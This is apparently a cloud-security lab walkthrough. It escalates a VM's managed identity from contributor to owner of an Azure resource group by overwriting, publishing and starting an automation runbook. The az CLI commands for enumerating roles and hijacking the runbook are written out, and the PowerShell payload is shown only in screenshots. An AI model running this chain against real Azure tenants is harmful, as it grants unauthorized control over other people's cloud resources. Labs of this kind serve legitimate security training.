# Objective

Leverage the misconfiguration and escalate privilege to the owner of the resource group.

# Solution

### Login to the virtual machine using the credentials obtained from the config.txt file.

Provide the write permission to the justin.pem file and login to the virtual machine

```
chmod +600 justin.pem

ssh -i justin.pem justin@40.85.170.40
```

![](https://user-images.githubusercontent.com/65826354/183737316-807e8ff3-cfe8-4cc3-a4db-9e260dea3eb1.png)

### Try to perform az login and check whether we can interact with the resources or not.

```
az login -i
```

![](https://user-images.githubusercontent.com/65826354/183737322-916d1d8e-b8f6-4e6e-8e84-e3fcd7758acf.png)

### List the resources

```
az resource list
```

![](https://user-images.githubusercontent.com/65826354/183737331-91b0f964-b607-424f-a930-ebc7248eb52f.png)

Look for the name of VM and principal id in the output.

### Check the level of access given to our VM

```
az role assignment list -g user_blog_app
```

Match the principal id with the resources

![](https://user-images.githubusercontent.com/65826354/183737337-f2f85115-8e8b-4c45-9002-a5768546b3e1.png)

Now, check the level of access given to our VM

![](https://user-images.githubusercontent.com/65826354/183737343-4a4a5a29-ebc2-43c6-a001-cf34510e20dc.png)

We have a contributor role assigned. We can not perform role assignment operations.

### Check the list of resources to find out which resource is associated with the owner-level identity.

![](https://user-images.githubusercontent.com/65826354/183737348-4d2b9549-9359-4efd-a167-f112013488d9.png)

![](https://user-images.githubusercontent.com/65826354/183737354-27fdcc60-58ec-45c8-a0c3-b0abf6d459a3.png)

We found an automation account with owner privileges. 

### Check for the runbooks to perform privileges escalation.

![](https://user-images.githubusercontent.com/65826354/183737359-b9ce3b71-1531-48a8-8ee7-6fc1cc689e91.png)

We found a PowerShellWorkFlow based runbook.

Run-
```
az automation runbook list --automation-account-name dev-automation-account-test -g user_blog_app
```

![](https://user-images.githubusercontent.com/65826354/183737366-32394666-7473-4d38-a266-817cf66c0a68.png)

### Write a PowerShell script

![](https://user-images.githubusercontent.com/65826354/183737373-0d4de08c-4782-41e5-947d-7dee0ecf35e1.png)

Now replace the details with the actual one.

![](https://user-images.githubusercontent.com/65826354/183737373-0d4de08c-4782-41e5-947d-7dee0ecf35e1.png)

### Replace, publish, and re-start the runbook

```
az automation runbook replace-content --automation-account-name "dev-automation-account-test" --resource-group "user_blog_app" --name "Get-AzureVM" --content @exploit.ps1

az automation runbook publish --automation-account-name "dev-automation-account-test" --resource-group "user_blog_app" --name "Get-AzureVM"

az automation runbook start --automation-account-name "dev-automation-account-test" --resource-group "user_blog_app" --name "Get-AzureVM"
```

![](https://user-images.githubusercontent.com/65826354/183737393-71783bc1-0d89-4df4-94fc-dfccd7b444c2.png)

### Check the role assignment list

```
az role assignment list -g user_blog_app
```

![](https://user-images.githubusercontent.com/65826354/183737404-198f7ef3-8b93-4e59-b0dd-05624d7c50c4.png)

Find our VM using the principal id.

![](https://user-images.githubusercontent.com/65826354/183737413-b1df1449-dd20-4ec3-9104-d7d487301fed.png)

The role got changed from contributor to owner.

***Congrats! We successfully escalated the privileges to the owner of the resource group.***


